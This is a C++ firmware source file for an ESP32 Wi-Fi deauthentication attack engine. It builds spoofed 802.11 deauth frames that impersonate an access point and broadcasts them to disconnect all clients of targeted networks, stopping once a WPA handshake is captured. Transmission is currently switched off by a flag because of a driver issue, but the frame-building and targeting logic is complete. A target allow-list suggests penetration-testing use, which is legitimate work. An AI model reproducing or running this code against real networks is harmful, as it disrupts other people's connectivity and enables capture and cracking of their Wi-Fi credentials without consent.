#include "DeauthEngine.h"

#include <Arduino.h>
#include <Logging.h>
#include <esp_wifi.h>

#include <climits>
#include <cstring>

#include "TargetList.h"

DeauthEngine deauthEngine;

namespace {
// 802.11 deauthentication frame: fixed 24-byte MAC header plus a 2-byte reason code, no frame
// body beyond that and no FCS (esp_wifi_80211_tx's radio appends the FCS in hardware).
struct __attribute__((packed)) DeauthFrame {
  uint16_t frameControl;  // 0x00C0 on this little-endian MCU -> wire bytes {0xC0, 0x00}: management/deauth
  uint16_t durationId;
  uint8_t addr1[6];  // destination
  uint8_t addr2[6];  // source (spoofed as the AP, so clients trust it)
  uint8_t addr3[6];  // BSSID
  uint16_t seqCtrl;   // left at 0; en_sys_seq=true below tells the driver to fill in a real one
  uint16_t reasonCode;
};

constexpr uint16_t kFrameControlDeauth = 0x00C0;
constexpr uint16_t kReasonClass3FromNonassoc = 0x0007;

// Flip once a safe way to get esp_wifi_80211_tx() working without breaking esp-aes is found (see
// DeauthEngine.h's class comment on the WIFI_MODE_STA revert). Until then, sendDeauthBurst()
// skips the transmit attempt entirely rather than making calls that are guaranteed to fail with
// no STA interface up — field testing showed those calls (6x esp_wifi_80211_tx + delay(2) each,
// run synchronously inside WifiSniffer::tick()'s main-loop queue drain) were enough blocking on
// their own to overflow the raw observation queue and visibly lag the device.
constexpr bool kTxCapable = false;
}  // namespace

bool DeauthEngine::begin() {
  memset(trackers, 0, sizeof(trackers));
  totalBursts = 0;
  totalFrames = 0;
  return true;
}

void DeauthEngine::setEnabled(bool value) {
  if (enabled == value) return;
  enabled = value;
  LOG_INF("DEAUTH", "Active deauth %s", enabled ? "enabled" : "disabled");
}

DeauthEngine::BssidTrack& DeauthEngine::trackerFor(uint32_t bssidHash) {
  int freeSlot = -1;
  size_t lruSlot = 0;
  unsigned long lruMs = ULONG_MAX;
  for (size_t i = 0; i < kTrackCapacity; i++) {
    if (trackers[i].inUse && trackers[i].bssidHash == bssidHash) return trackers[i];
    if (!trackers[i].inUse) {
      if (freeSlot < 0) freeSlot = static_cast<int>(i);
    } else if (trackers[i].lastBurstMs < lruMs) {
      // Least-recently-bursted in-use slot, tracked as the fallback eviction target once the
      // table is full. Entries that never actually fired (lastBurstMs == 0) always sort first
      // here, so they're evicted before anything with a real cooldown in progress — losing an
      // untouched placeholder costs nothing, but wiping a live cooldown was the bug (see
      // kTrackCapacity's comment: evicting a fixed slot 0 instead of the actual LRU entry let a
      // BSSID's cooldown memory get wiped by unrelated new networks appearing, letting it burst
      // again within milliseconds instead of respecting kCooldownMs).
      lruMs = trackers[i].lastBurstMs;
      lruSlot = i;
    }
  }
  const size_t slot = freeSlot >= 0 ? static_cast<size_t>(freeSlot) : lruSlot;
  trackers[slot] = BssidTrack{bssidHash, 0, false, true};
  return trackers[slot];
}

bool DeauthEngine::sendDeauthBurst(const MacAddress& bssid, uint8_t channel) {
  totalBursts++;
  if (!kTxCapable) return false;  // see kTxCapable's comment — guaranteed to fail right now, so don't even try

  DeauthFrame frame{};
  frame.frameControl = kFrameControlDeauth;
  frame.durationId = 0;
  memset(frame.addr1, 0xFF, 6);  // broadcast: deauth every client currently associated to this BSSID at once
  memcpy(frame.addr2, bssid.bytes, 6);
  memcpy(frame.addr3, bssid.bytes, 6);
  frame.seqCtrl = 0;
  frame.reasonCode = kReasonClass3FromNonassoc;

  esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);

  bool anyFailed = false;
  for (uint8_t i = 0; i < kFramesPerBurst; i++) {
    if (esp_wifi_80211_tx(WIFI_IF_STA, &frame, sizeof(frame), true) != ESP_OK) {
      anyFailed = true;
    }
    totalFrames++;
    delay(2);
  }
  return !anyFailed;
}

void DeauthEngine::onObservation(const WifiObservation& obs) {
  if (!enabled) return;
  if (obs.kind != WifiFrameKind::Beacon && obs.kind != WifiFrameKind::ProbeResponse &&
      obs.kind != WifiFrameKind::EapolHandshake) {
    return;  // only BSSID-confirming frames (beacon/probe-resp) and handshake frames feed targeting
  }

  const uint32_t bssidHash = obs.bssid.fnv1a();
  BssidTrack& track = trackerFor(bssidHash);

  if (obs.kind == WifiFrameKind::EapolHandshake) {
    track.handshakeSeen = true;  // got what we came for — stop attacking this BSSID
    return;
  }

  if (track.handshakeSeen) return;
  if (!targetList.isAllowed(obs.bssid)) return;

  const unsigned long now = millis();
  if (track.lastBurstMs != 0 && now - track.lastBurstMs < kCooldownMs) return;
  track.lastBurstMs = now;

  LOG_INF("DEAUTH", "Deauth burst: %02X:%02X:%02X:%02X:%02X:%02X ch%u", obs.bssid.bytes[0], obs.bssid.bytes[1],
          obs.bssid.bytes[2], obs.bssid.bytes[3], obs.bssid.bytes[4], obs.bssid.bytes[5], obs.channel);
  sendDeauthBurst(obs.bssid, obs.channel);
}
